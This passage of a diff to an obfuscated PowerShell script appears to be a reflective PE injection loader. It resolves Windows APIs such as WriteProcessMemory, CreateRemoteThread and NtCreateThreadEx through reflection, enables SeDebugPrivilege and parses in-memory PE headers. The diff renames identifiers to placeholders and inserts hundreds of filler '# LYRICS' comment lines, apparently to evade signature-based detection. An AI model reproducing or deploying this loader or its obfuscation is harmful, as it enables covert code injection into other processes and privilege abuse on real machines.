             $VAR0048 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0046, $VAR0047)
+# LYRICS219
+# LYRICS220
             $VAR0042 | Add-Member NoteProperty -Name FUN032 -Value $VAR0048
-
+# LYRICS221
             $VAR0049 = FUN012 $VAR0309 memcpy
             $VAR0050 = FUN011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
             $VAR0051 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0049, $VAR0050)
+# LYRICS222
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN033 -Value $VAR0051
-
+# LYRICS223
             $VAR0052 = FUN012 $VAR0309 memset
             $VAR0053 = FUN011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+# LYRICS224
             $VAR0054 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0052, $VAR0053)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN034 -Value $VAR0054
-
+# LYRICS225
+# LYRICS226
             $VAR0055 = FUN012 $VAR0302 $VAR0329
             $VAR0056 = FUN011 @([String]) ([IntPtr])
+# LYRICS227
             $VAR0057 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0055, $VAR0056)
+# LYRICS228
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN035 -Value $VAR0057
-
+# LYRICS229
             $VAR0058 = FUN012 $VAR0302 $VAR0312
+# LYRICS230
             $VAR0059 = FUN011 @([IntPtr], [String]) ([IntPtr])
             $VAR0060 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0058, $VAR0059)
+# LYRICS231
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN036 -Value $VAR0060
-
+# LYRICS232
             $VAR0061 = FUN012 $VAR0302 $VAR0312 
             $VAR0062 = FUN011 @([IntPtr], [IntPtr]) ([IntPtr])
+# LYRICS233
             $VAR0063 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0061, $VAR0062)
+# LYRICS234
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN037 -Value $VAR0063
-
+# LYRICS235
             $VAR0064 = FUN012 $VAR0302 VirtualFree
             $VAR0065 = FUN011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
             $VAR0066 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0064, $VAR0065)
+# LYRICS236
+# LYRICS237
             $VAR0042 | Add-Member NoteProperty -Name FUN038 -Value $VAR0066
-
+# LYRICS238
             $VAR0067 = FUN012 $VAR0302 VirtualFreeEx
+# LYRICS239
             $VAR0068 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
             $VAR0069 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0067, $VAR0068)
+# LYRICS240
             $VAR0042 | Add-Member NoteProperty -Name FUN039 -Value $VAR0069
-
+# LYRICS241
             $VAR0070 = FUN012 $VAR0302 VirtualProtect
+# LYRICS242
             $VAR0071 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+# LYRICS243
             $VAR0072 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0070, $VAR0071)
             $VAR0042 | Add-Member NoteProperty -Name FUN040 -Value $VAR0072
-
+# LYRICS244
             $VAR0073 = FUN012 $VAR0302 GetModuleHandleA
+# LYRICS245
             $VAR0074 = FUN011 @([String]) ([IntPtr])
+# LYRICS246
             $VAR0075 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0073, $VAR0074)
             $VAR0042 | Add-Member NoteProperty -Name FUN041 -Value $VAR0075
-
+# LYRICS247
             $VAR0076 = FUN012 $VAR0302 FreeLibrary
+# LYRICS248
             $VAR0077 = FUN011 @([IntPtr]) ([Bool])
             $VAR0078 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0076, $VAR0077)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN042 -Value $VAR0078
-
+# LYRICS249
             $VAR0079 = FUN012 $VAR0302 OpenProcess
+# LYRICS250
             $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
             $VAR0081 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0079, $VAR0080)
+# LYRICS251
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN043 -Value $VAR0081
-
+# LYRICS252
             $VAR0082 = FUN012 $VAR0302 WaitForSingleObject
             $VAR0083 = FUN011 @([IntPtr], [UInt32]) ([UInt32])
             $VAR0084 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0082, $VAR0083)
+# LYRICS253
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN044 -Value $VAR0084
-
+# LYRICS254
             $VAR0085 = FUN012 $VAR0302 WriteProcessMemory
             $VAR0086 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+# LYRICS255
             $VAR0087 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0085, $VAR0086)
+# LYRICS256
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN045 -Value $VAR0087
-
+# LYRICS257
             $VAR0088 = FUN012 $VAR0302 ReadProcessMemory
+# LYRICS258
             $VAR0089 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
             $VAR0090 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0088, $VAR0089)
+# LYRICS259
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN046 -Value $VAR0090
-
+# LYRICS260
             $VAR0091 = FUN012 $VAR0302 CreateRemoteThread
+# LYRICS261
             $VAR0092 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
             $VAR0093 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0091, $VAR0092)
+# LYRICS262
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN047 -Value $VAR0093
-
+# LYRICS263
             $VAR0094 = FUN012 $VAR0302 GetExitCodeThread
+# LYRICS264
+# LYRICS265
             $VAR0095 = FUN011 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
+# LYRICS266
             $VAR0096 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0094, $VAR0095)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN048 -Value $VAR0096
-
+# LYRICS267
             $VAR0097 = FUN012 $VAR0306 OpenThreadToken
+# LYRICS268
             $VAR0098 = FUN011 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
             $VAR0099 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0097, $VAR0098)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN049 -Value $VAR0099
-
+# LYRICS269
             $VAR0100 = FUN012 $VAR0302 GetCurrentThread
+# LYRICS270
             $VAR0101 = FUN011 @() ([IntPtr])
+# LYRICS271
             $VAR0102 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0100, $VAR0101)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN050 -Value $VAR0102
-
+# LYRICS272
             $VAR0103 = FUN012 $VAR0306 AdjustTokenPrivileges
+# LYRICS273
             $VAR0104 = FUN011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
             $VAR0105 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0103, $VAR0104)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN051 -Value $VAR0105
-
+# LYRICS274
             $VAR0106 = FUN012 $VAR0306 LookupPrivilegeValueA
+# LYRICS275
             $VAR0107 = FUN011 @([String], [String], [IntPtr]) ([Bool])
+# LYRICS276
             $VAR0108 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0106, $VAR0107)
+# LYRICS277
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN052 -Value $VAR0108
-
+# LYRICS278
             $VAR0109 = FUN012 $VAR0306 ImpersonateSelf
             $VAR0110 = FUN011 @([Int32]) ([Bool])
+# LYRICS279
             $VAR0111 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0109, $VAR0110)
+# LYRICS280
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN053 -Value $VAR0111
-
-            
+# LYRICS281
+# LYRICS282
             if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
+# LYRICS283
                 $VAR0112 = FUN012 NtDll.dll NtCreateThreadEx
+# LYRICS284
                 $VAR0113 = FUN011 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
                 $VAR0114 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0112, $VAR0113)
+# LYRICS285
                 $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN054 -Value $VAR0114
             }
-
+# LYRICS286
             $VAR0115 = FUN012 $VAR0302 IsWow64Process
+# LYRICS287
             $VAR0116 = FUN011 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
             $VAR0117 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0115, $VAR0116)
+# LYRICS288
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN055 -Value $VAR0117
-
+# LYRICS289
             $VAR0118 = FUN012 $VAR0302 CreateThread
+# LYRICS290
             $VAR0119 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
+# LYRICS291
             $VAR0120 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0118, $VAR0119)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN056 -Value $VAR0120
-
+# LYRICS292
             return $VAR0042
         }
-        
-
-
-   
+# LYRICS293
+# LYRICS294
+# LYRICS295
+# LYRICS296
         Function FUN004 {
+# LYRICS297
+# LYRICS298
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Int64]
                 $VAR0121,
-
+# LYRICS299
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
                 $VAR0122
             )
-
+# LYRICS300
             [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
             [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
+# LYRICS301
             [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
-
+# LYRICS302
             if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                 $VAR0124 = 0
+# LYRICS303
                 for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
+# LYRICS304
+# LYRICS305
                     $Val = $VAR0121Bytes[$i] - $VAR0124
-                    
+# LYRICS306
                     if ($Val -lt $VAR0122Bytes[$i]) {
                         $Val += 256
+# LYRICS307
                         $VAR0124 = 1
                     }
                     else {
+# LYRICS308
                         $VAR0124 = 0
                     }
-
+# LYRICS309
+# LYRICS310
                     [UInt16]$Sum = $Val - $VAR0122Bytes[$i]
-
+# LYRICS311
                     $VAR0123[$i] = $Sum -band 0x00FF
+# LYRICS312
                 }
             }
             else {
                 Throw "ERROR01"
             }
-
+# LYRICS313
             return [BitConverter]::ToInt64($VAR0123, 0)
         }
-
+# LYRICS314
         Function FUN005 {
+# LYRICS315
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Int64]
                 $VAR0121,
-
+# LYRICS316
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
                 $VAR0122
             )
-
+# LYRICS317
             [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
+# LYRICS318
             [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
             [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
-
+# LYRICS319
             if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
+# LYRICS320
                 $VAR0124 = 0
                 for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
-                    
+# LYRICS321
+# LYRICS322
                     [UInt16]$Sum = $VAR0121Bytes[$i] + $VAR0122Bytes[$i] + $VAR0124
-
+# LYRICS323
                     $VAR0123[$i] = $Sum -band 0x00FF
-
+# LYRICS324
                     if (($Sum -band 0xFF00) -eq 0x100) {
+# LYRICS325
                         $VAR0124 = 1
                     }
                     else {
+# LYRICS326
                         $VAR0124 = 0
                     }
                 }
@@ -695,30 +889,35 @@ function FUN000 {
             else {
                 Throw "ERROR02"
             }
-
+# LYRICS327
             return [BitConverter]::ToInt64($VAR0123, 0)
         }
-
+# LYRICS328
         Function FUN006 {
+# LYRICS329
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Int64]
                 $VAR0121,
-
+# LYRICS330
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
                 $VAR0122
             )
-
+# LYRICS331
             [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
+# LYRICS332
             [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
-
+# LYRICS333
             if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                 for ($i = $VAR0121Bytes.Count - 1; $i -ge 0; $i--) {
+# LYRICS334
                     if ($VAR0121Bytes[$i] -gt $VAR0122Bytes[$i]) {
+# LYRICS335
                         return $true
                     }
                     elseif ($VAR0121Bytes[$i] -lt $VAR0122Bytes[$i]) {
+# LYRICS336
                         return $false
                     }
                 }
@@ -726,176 +925,203 @@ function FUN000 {
             else {
                 Throw "ERROR03"
             }
-
+# LYRICS337
             return $false
         }
-
-
+# LYRICS338
+# LYRICS339
         Function FUN007 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [UInt64]
+# LYRICS340
                 $VAR0123
             )
-
+# LYRICS341
             [Byte[]]$VAR0123Bytes = [BitConverter]::GetBytes($VAR0123)
+# LYRICS342
             return ([BitConverter]::ToInt64($VAR0123Bytes, 0))
         }
-
-
+# LYRICS343
+# LYRICS344
         Function FUN008 {
+# LYRICS345
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 $VAR0123 
             )
-
+# LYRICS346
             $VAR0123Size = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR0123.GetType()) * 2
+# LYRICS347
             $VAR0124 = "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 
-
+# LYRICS348
             return $VAR0124
         }
-
+# LYRICS349
         Function FUN009 {
+# LYRICS350
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [String]
                 $VAR0125,
-
+# LYRICS351
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0126,
-
+# LYRICS352
                 [Parameter(Position = 2, Mandatory = $true)]
                 [IntPtr]
                 $VAR0127,
-
+# LYRICS353
                 [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
                 [IntPtr]
                 $Size
             )
-
+# LYRICS354
             [IntPtr]$VAR0128 = [IntPtr](FUN005 ($VAR0127) ($Size))
-
+# LYRICS355
+# LYRICS356
             $VAR0128 = $VAR0126.CONST038
-
-            
+# LYRICS357
+# LYRICS358
         }
-
+# LYRICS359
         Function FUN010 {
+# LYRICS360
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Byte[]]
                 $Bytes,
-
+# LYRICS361
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
                 $VAR0129
             )
-
+# LYRICS362
             for ($VAR0130 = 0; $VAR0130 -lt $Bytes.Length; $VAR0130++) {
+# LYRICS363
                 [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0129, $VAR0130, $Bytes[$VAR0130])
             }
         }
-
-        
+# LYRICS364
+# LYRICS365
         Function FUN011 {
+# LYRICS366
             Param
             (
                 [OutputType([Type])]
-
+# LYRICS367
                 [Parameter( Position = 0)]
                 [Type[]]
                 $Parameters = (New-Object Type[](0)),
-
+# LYRICS368
                 [Parameter( Position = 1 )]
                 [Type]
                 $ReturnType = [Void]
             )
-
+# LYRICS369
             $Domain = [AppDomain]::CurrentDomain
             $VAR0131 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+# LYRICS370
             $VAR013 = $Domain.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
             $VAR014 = $VAR013.DefineDynamicModule('InMemoryModule', $false)
             $VAR011 = $VAR014.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+# LYRICS371
             $VAR0132 = $VAR011.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
             $VAR0132.SetImplementationFlags('Runtime, Managed')
+# LYRICS372
             $VAR0133 = $VAR011.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+# LYRICS373
             $VAR0133.SetImplementationFlags('Runtime, Managed')
-
+# LYRICS374
             Write-Output $VAR011.CreateType()
         }
-
-
-        
+# LYRICS375
+# LYRICS376
+# LYRICS377
         Function FUN012 {
+# LYRICS378
             Param
             (
                 [OutputType([IntPtr])]
-
+# LYRICS379
                 [Parameter( Position = 0, Mandatory = $True )]
                 [String]
                 $Module,
-
+# LYRICS380
                 [Parameter( Position = 1, Mandatory = $True )]
                 [String]
                 $VAR0139
             )
-
-            
+# LYRICS381
+# LYRICS382
             $VAR0134 = [AppDomain]::CurrentDomain.GetAssemblies() |
             Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+# LYRICS383
             $VAR0135 = $VAR0134.GetType('Microsoft.Win32.UnsafeNativeMethods')
-
-            
+# LYRICS384
+# LYRICS385
             $VAR0075 = $VAR0135.GetMethod('GetModuleHandle')
+# LYRICS386
             $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq $VAR0312 } | Select-Object -first 1
-
-            
+# LYRICS387
+# LYRICS388
             $VAR0136 = $VAR0075.Invoke($null, @($Module))
-
-            
+# LYRICS389
+# LYRICS390
             try {
                 $VAR0137 = New-Object IntPtr
                 $VAR0138 = New-Object System.Runtime.InteropServices.HandleRef($VAR0137, $VAR0136)
+# LYRICS391
                 Write-Output $VAR0060.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139))
             }
             catch {
-                
+# LYRICS392
                 Write-Output $VAR0060.Invoke($null, @($VAR0136, $VAR0139))
+# LYRICS393
             }
         }
-
+# LYRICS394
         Function FUN013 {
+# LYRICS395
             Param(
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0042,
-
+# LYRICS396
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR010,
-
+# LYRICS397
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
                 $VAR0041
             )
-
+# LYRICS398
             [IntPtr]$VAR0141 = $VAR0042.FUN050.Invoke()
+# LYRICS399
             if ($VAR0141 -eq [IntPtr]::Zero) {
+# LYRICS400
                 Throw "ERROR03"
             }
-
+# LYRICS401
             [IntPtr]$VAR0142 = [IntPtr]::Zero
+# LYRICS402
             [Bool]$VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
+# LYRICS403
             if ($VAR0144 -eq $false) {
                 $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+# LYRICS404
                 if ($VAR0148 -eq $VAR0041.CONST029) {
+# LYRICS405
                     $VAR0144 = $VAR0042.FUN053.Invoke(3)
+# LYRICS406
                     if ($VAR0144 -eq $false) {
                         Throw "ERROR04"
                     }
-
+# LYRICS407
                     $VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
+# LYRICS408
                     if ($VAR0144 -eq $false) {
                         Throw "ERROR05"
                     }
@@ -904,354 +1130,422 @@ function FUN000 {
                     Throw "ERROR06: $VAR0148"
                 }
             }
-
+# LYRICS409
             [IntPtr]$VAR0143 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST163))
+# LYRICS410
             $VAR0144 = $VAR0042.FUN052.Invoke($null, "SeDebugPrivilege", $VAR0143)
+# LYRICS411
             if ($VAR0144 -eq $false) {
                 Throw "ERROR07"
             }
-
+# LYRICS412
             [UInt32]$VAR0145 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST167)
+# LYRICS413
             [IntPtr]$VAR0146 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0145)
             $VAR0147 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0146, [Type]$VAR010.CONST167)
+# LYRICS414
             $VAR0147.CONST168 = 1
             $VAR0147.CONST169.CONST163 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0143, [Type]$VAR010.CONST163)
+# LYRICS415
             $VAR0147.CONST169.Attributes = $VAR0041.CONST028
+# LYRICS416
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0147, $VAR0146, $true)
-
+# LYRICS417
             $VAR0144 = $VAR0042.FUN051.Invoke($VAR0142, $false, $VAR0146, $VAR0145, [IntPtr]::Zero, [IntPtr]::Zero)
+# LYRICS418
             $VAR0148 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
+# LYRICS419
+# LYRICS420
             if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
-                
+# LYRICS421
             }
-
+# LYRICS422
             [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0146)
         }
-
+# LYRICS423
         Function FUN014 {
+# LYRICS424
             Param(
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
                 $VAR0151,
-
+# LYRICS425
                 [Parameter(Position = 2, Mandatory = $true)]
                 [IntPtr]
                 $VAR0127,
-
+# LYRICS426
                 [Parameter(Position = 3, Mandatory = $false)]
                 [IntPtr]
                 $VAR0152 = [IntPtr]::Zero,
-
+# LYRICS427
                 [Parameter(Position = 4, Mandatory = $true)]
                 [System.Object]
                 $VAR0042
             )
-
+# LYRICS428
             [IntPtr]$VAR0149 = [IntPtr]::Zero
-
+# LYRICS429
             $VAR0150 = [Environment]::OSVersion.Version
-            
+# LYRICS430
+# LYRICS431
             if (($VAR0150 -ge (New-Object 'Version' 6, 0)) -and ($VAR0150 -lt (New-Object 'Version' 6, 2))) {
-                
+# LYRICS432
+# LYRICS433
                 $RetVal = $VAR0042.FUN054.Invoke([Ref]$VAR0149, 0x1FFFFF, [IntPtr]::Zero, $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
+# LYRICS434
+# LYRICS435
                 $VAR0153 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+# LYRICS436
                 if ($VAR0149 -eq [IntPtr]::Zero) {
+# LYRICS437
                     Throw "ERROR63: $RetVal. $VAR0153"
                 }
             }
-            
+# LYRICS438
             else {
-                
+# LYRICS439
                 $VAR0149 = $VAR0042.FUN047.Invoke($VAR0151, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0, [IntPtr]::Zero)
             }
-
+# LYRICS440
             if ($VAR0149 -eq [IntPtr]::Zero) {
+# LYRICS441
                 Write-Error "ERROR64" -ErrorAction Stop
             }
-
+# LYRICS442
             return $VAR0149
         }
-
+# LYRICS443
         Function FUN015 {
+# LYRICS444
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
                 $VAR0263,
-
+# LYRICS445
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR010
             )
-
+# LYRICS446
             $VAR0154 = New-Object System.Object
-
-            
+# LYRICS447
+# LYRICS448
             $VAR0155 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0263, [Type]$VAR010.CONST123)
-
-            
+# LYRICS449
+# LYRICS450
             [IntPtr]$VAR0156 = [IntPtr](FUN005 ([Int64]$VAR0263) ([Int64][UInt64]$VAR0155.CONST141))
+# LYRICS451
             $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST030 -Value $VAR0156
+# LYRICS452
             $VAR0157 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03164)
-
-            
+# LYRICS453
+# LYRICS454
             if ($VAR0157.Signature -ne 0x00004550) {
                 throw "ERROR65"
             }
-
+# LYRICS455
             if ($VAR0157.CONST122.Magic -eq 'CONST101') {
+# LYRICS456
                 $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0157
+# LYRICS457
                 $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $true
             }
             else {
                 $VAR0158 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0156, [Type]$VAR010.CONST03132)
+# LYRICS458
                 $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0158
                 $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $false
             }
-
+# LYRICS459
             return $VAR0154
         }
-
-
-        
+# LYRICS460
+# LYRICS461
+# LYRICS462
         Function FUN016 {
+# LYRICS463
             Param(
                 [Parameter( Position = 0, Mandatory = $true )]
                 [Byte[]]
                 $VAR001,
-
+# LYRICS464
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR010
             )
-
+# LYRICS465
             $VAR0126 = New-Object System.Object
-
-            
+# LYRICS466
+# LYRICS467
             [IntPtr]$VAR0159 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR001.Length)
+# LYRICS468
             [System.Runtime.InteropServices.Marshal]::Copy($VAR001, 0, $VAR0159, $VAR001.Length) | Out-Null
-
-            
+# LYRICS469
+# LYRICS470
             $VAR0154 = FUN015 -VAR0263 $VAR0159 -VAR010 $VAR010
-
-            
+# LYRICS471
+# LYRICS472
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
+# LYRICS473
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0196' -Value ($VAR0154.CONST031.CONST122.CONST058)
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
+# LYRICS474
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST034' -Value ($VAR0154.CONST031.CONST122.CONST034)
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST035' -Value ($VAR0154.CONST031.CONST122.CONST035)
-
-            
+# LYRICS475
+# LYRICS476
+# LYRICS477
             [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0159)
-
+# LYRICS478
             return $VAR0126
         }
-
-
-        
-        
+# LYRICS479
+# LYRICS480
+# LYRICS481
+# LYRICS482
         Function FUN017 {
+# LYRICS483
             Param(
                 [Parameter( Position = 0, Mandatory = $true)]
                 [IntPtr]
                 $VAR0263,
-
+# LYRICS484
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR010,
-
+# LYRICS485
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR0041
             )
-
+# LYRICS486
             if ($VAR0263 -eq $null -or $VAR0263 -eq [IntPtr]::Zero) {
+# LYRICS487
                 throw 'ERROR66'
             }
-
+# LYRICS488
             $VAR0126 = New-Object System.Object
-
-            
+# LYRICS489
+# LYRICS490
             $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010
-
-            
+# LYRICS491
+# LYRICS492
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0263' -Value $VAR0263
+# LYRICS493
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST031' -Value ($VAR0154.CONST031)
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST1000' -Value ($VAR0154.CONST030) 
+# LYRICS494
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
-
+# LYRICS495
             if ($VAR0126.CONST032 -eq $true) {
                 [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03164)))
+# LYRICS496
                 $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
             }
             else {
                 [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03132)))
+# LYRICS497
                 $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
             }
-
+# LYRICS498
             if (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST022) -eq $VAR0041.CONST022) {
+# LYRICS499
                 $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Library'
             }
             elseif (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST021) -eq $VAR0041.CONST021) {
+# LYRICS500
